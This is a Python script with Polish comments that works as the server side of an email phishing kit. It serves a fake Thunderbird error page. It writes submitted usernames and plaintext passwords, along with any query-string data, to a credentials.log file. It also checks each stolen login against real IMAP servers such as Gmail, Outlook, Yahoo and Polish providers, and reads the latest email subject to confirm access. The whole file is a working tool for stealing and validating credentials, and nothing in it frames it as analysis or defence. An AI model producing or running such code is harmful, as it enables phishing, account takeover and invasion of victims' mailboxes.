from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import imaplib
import ssl
import json
import time
import threading

IMAP_SERVERS = {
    "wp.pl": "imap.wp.pl", "gmail.com": "imap.gmail.com", "onet.pl": "imap.poczta.onet.pl",
    "o2.pl": "imap.o2.pl", "interia.pl": "imap.poczta.interia.pl", "outlook.com": "outlook.office365.com",
    "yahoo.com": "imap.mail.yahoo.com"
}

# Funkcja pomocnicza do wylogowania w tle
def delayed_logout(mail, email):
    def _logout():
        print(f"[*] Sesja IMAP dla {email} otwarta. Automatyczne wylogowanie za 5 sekund...", flush=True)
        time.sleep(5)
        try:
            mail.logout()
            print(f"[*] Wylogowano z IMAP dla {email}.", flush=True)
        except Exception as e:
            print(f"[-] Błąd podczas wylogowywania: {e}", flush=True)
    
    # Uruchamiamy wątek w tle
    t = threading.Thread(target=_logout)
    t.daemon = True
    t.start()

def check_imap(email, password):
    domain = email.split('@')[-1].lower()
    server = IMAP_SERVERS.get(domain, f"imap.{domain}")
    print(f"[*] Próba logowania IMAP: {email} na {server}...", flush=True)
    try:
        context = ssl.create_default_context()
        mail = imaplib.IMAP4_SSL(server, ssl_context=context)
        mail.login(email, password)
        print(f"[+] SUKCES! Dane są poprawne dla {email}", flush=True)
        
        mail.select('inbox')
        status, messages = mail.search(None, 'ALL')
        if status == 'OK' and messages[0]:
            latest_email_id = messages[0].split()[-1]
            status, msg_data = mail.fetch(latest_email_id, '(BODY[HEADER.FIELDS (SUBJECT)])')
            if status == 'OK':
                raw_header = msg_data[0][1].decode('utf-8')
                print(f"[!] Podgląd skrzynki: Ostatni e-mail -> {raw_header.strip()}", flush=True)
        
        # Zamiast czekać, uruchamiamy wylogowanie w tle i NATYCHMIAST zwracamy True
        delayed_logout(mail, email)
        return True
        
    except imaplib.IMAP4.error as e:
        print(f"[-] BŁĄD logowania dla {email}: {e}", flush=True)
        return False
    except Exception as e:
        print(f"[-] Błąd połączenia ({server}): {e}", flush=True)
        return False

class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        self.send_response(200); self._cors(); self.end_headers()

    def do_GET(self):
        if self.path == '/thunderbird_error.html':
            self.send_response(200); self.send_header('Content-Type', 'text/html; charset=utf-8'); self._cors(); self.end_headers()
            with open('thunderbird_error.html', 'r', encoding='utf-8') as f: self.wfile.write(f.read().encode('utf-8'))
            return
        if self.path == '/octopus-setup.svg':
            self.send_response(200); self.send_header('Content-Type', 'image/svg+xml'); self._cors(); self.end_headers()
            try:
                with open('octopus-setup.svg', 'rb') as f: self.wfile.write(f.read())
            except Exception: pass
            return

        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        if qs:
            ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            entry = f"[{ts}] GET LEAK -> {qs}\n"
            with open('credentials.log', 'a') as f: f.write(entry)
        self.send_response(200); self.send_header('Content-Length', '2'); self._cors(); self.end_headers(); self.wfile.write(b"OK")

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8')
        parsed = urllib.parse.parse_qs(data)
        email = parsed.get('user', [''])[0]
        password = parsed.get('pass', [''])[0]
        
        is_valid = False
        if email and password:
            is_valid = check_imap(email, password)
        
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry = f"[{ts}] POST VALIDATE -> user={email}, pass={password}, valid={is_valid}\n"
        with open('credentials.log', 'a') as f: f.write(entry)

        response = json.dumps({"valid": is_valid}).encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(response)))
        self._cors()
        self.end_headers()
        self.wfile.write(response)

    def log_message(self, fmt, *args): pass

print("[*] Serwer (z natychmiastową odpowiedzią i wątkiem w tle) działa na porcie 8080...", flush=True)
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
